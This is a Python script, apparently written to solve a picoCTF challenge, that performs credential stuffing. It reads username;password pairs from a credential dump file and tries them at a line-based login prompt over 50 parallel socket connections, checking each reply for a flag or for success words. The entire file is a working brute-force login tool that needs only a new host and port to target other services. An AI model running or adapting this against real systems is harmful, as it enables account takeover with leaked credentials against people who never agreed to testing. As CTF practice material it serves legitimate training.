"""Fast credential stuffing with concurrent connections."""
import socket
import re
import concurrent.futures
import time

HOST = "crystal-peak.picoctf.net"
PORT = 52020
CREDS_FILE = "creds-dump.txt"

def try_credential(args):
    """Try a single credential pair."""
    idx, user, pwd = args
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((HOST, PORT))
        # Read until "Username: "
        data = b""
        while b"Username: " not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        # Send username
        s.sendall((user + "\n").encode())
        # Read until "Password: "
        data2 = b""
        while b"Password: " not in data2:
            chunk = s.recv(4096)
            if not chunk:
                break
            data2 += chunk
        # Send password
        s.sendall((pwd + "\n").encode())
        # Read response
        time.sleep(0.1)
        response = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        s.close()
        full = (data + data2 + response).decode("utf-8", errors="replace")
        return (idx, user, pwd, full)
    except Exception as e:
        return (idx, user, pwd, f"ERROR: {e}")

# Read credentials
creds = []
with open(CREDS_FILE, "r", errors="replace") as f:
    for line in f:
        line = line.strip()
        if ";" in line:
            user, pwd = line.split(";", 1)
            creds.append((user.strip(), pwd.strip()))

print(f"[*] Loaded {len(creds)} credential pairs")

# Use thread pool for parallel attempts
print(f"[*] Starting parallel credential stuffing (50 threads)...")
start = time.time()
found_flag = None

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    # Submit in batches to avoid overwhelming
    batch_size = 50
    for batch_start in range(0, len(creds), batch_size):
        batch = creds[batch_start:batch_start + batch_size]
        indexed = [(batch_start + i, u, p) for i, (u, p) in enumerate(batch)]
        futures = {executor.submit(try_credential, args): args for args in indexed}
        for future in concurrent.futures.as_completed(futures):
            idx, user, pwd, response = future.result()
            if "ERROR" in str(response):
                continue
            # Check for flag or success
            if "picoCTF{" in response:
                print(f"\n[+] FLAG FOUND at #{idx}: {user}:{pwd}")
                print(f"    Response: {response[:500]}")
                flag_match = re.search(r'picoCTF\{[^}]+\}', response)
                if flag_match:
                    found_flag = flag_match.group()
                    # Cancel remaining
                    for f in futures:
                        f.cancel()
                    break
            # Also check for success indicators (not invalid/failed)
            lower = response.lower()
            if "invalid" not in lower and "incorrect" not in lower and "failed" not in lower:
                if any(s in lower for s in ["flag", "welcome", "success", "granted", "authenticated"]):
                    print(f"\n[+] Possible hit at #{idx}: {user}:{pwd}")
                    print(f"    Response: {response[:500]}")
        if found_flag:
            break
        elapsed = time.time() - start
        print(f"  [{batch_start + len(batch)}/{len(creds)}] {elapsed:.0f}s elapsed")

elapsed = time.time() - start
if found_flag:
    print(f"\n[+] FLAG: {found_flag}")
else:
    print(f"\n[-] No flag found after {elapsed:.0f}s")
